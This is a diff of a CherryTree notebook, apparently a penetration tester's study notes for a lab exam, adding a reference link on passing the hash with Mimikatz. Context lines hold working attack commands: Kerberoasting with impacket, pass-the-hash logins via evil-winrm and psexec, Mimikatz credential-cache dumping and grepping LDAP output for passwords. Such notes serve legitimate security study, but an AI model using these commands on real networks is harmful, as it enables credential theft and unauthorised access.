@@ -1547,7 +1547,7 @@ impacket-GetADUsers domain/user:password@IP</codebox>
             <codebox char_offset="35" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Impacket-GetUserSPN -request -dc-ip 10.11.1. domain.local/user</codebox>
           </node>
         </node>
-        <node name="Pass The Hash Attack" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689619" ts_lastsave="1687690728">
+        <node name="Pass The Hash Attack" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689619" ts_lastsave="1688335472">
           <rich_text>
 
 
@@ -1561,10 +1561,14 @@ or
           <rich_text justification="left"></rich_text>
           <rich_text>
 
+with mimikatz
+</rich_text>
+          <rich_text link="webs https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/">https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/</rich_text>
+          <rich_text>
+
 </rich_text>
           <codebox char_offset="3" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.11.1. -u Administrator -H 0e0363213e37b94221497260b0bcb4fc</codebox>
           <codebox char_offset="10" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@10.11.1. -hashes randomLMHASH:oeasdNTLMHASH</codebox>
-          <codebox char_offset="11" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
         </node>
         <node name="Useful Powershell/CMD Commands" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689661" ts_lastsave="1688334861">
           <rich_text>
@@ -1934,7 +1938,7 @@ once u have the output make sure u check log file for
           <codebox char_offset="128" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cat ldapSearch.log| grep -i password</codebox>
           <codebox char_offset="152" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">grep 'sAMAccountName:' ldapSearch.log</codebox>
         </node>
-        <node name="MIMIKATZ" unique_id="91" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688334012" ts_lastsave="1688335003">
+        <node name="MIMIKATZ" unique_id="91" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688334012" ts_lastsave="1688335156">
           <rich_text underline="single" weight="heavy">Mimikatz Commands:</rich_text>
           <rich_text>
 &#13;&#13;• </rich_text>
@@ -1990,6 +1994,10 @@ once u have the output make sure u check log file for
 &#13;• </rich_text>
           <rich_text link="webs https://translate.googleusercontent.com/translate_c?depth=1&amp;hl=en&amp;ie=UTF8&amp;prev=_t&amp;rurl=translate.google.com&amp;sl=fr&amp;tl=en&amp;u=http://blog.gentilkiwi.com/securite/mscache-v2-dcc2-iteration&amp;usg=ALkJrhjpLNpxdAk-QbYsP-iApIcsLGHdWA">lsadump cache</rich_text>
           <rich_text>: (requires token::elevate to be SYSTEM)&#13;mimikatz # lsadump::cache&#13;&#13;◇ Dumps cached Windows domain credentials from HKEY_LOCAL_MACHINE\SECURITY\Cache (accessible SYSTEM).
+
+</rich_text>
+          <rich_text link="webs https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/">https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/</rich_text>
+          <rich_text>
 &#13;
 &#13;
 &#13;
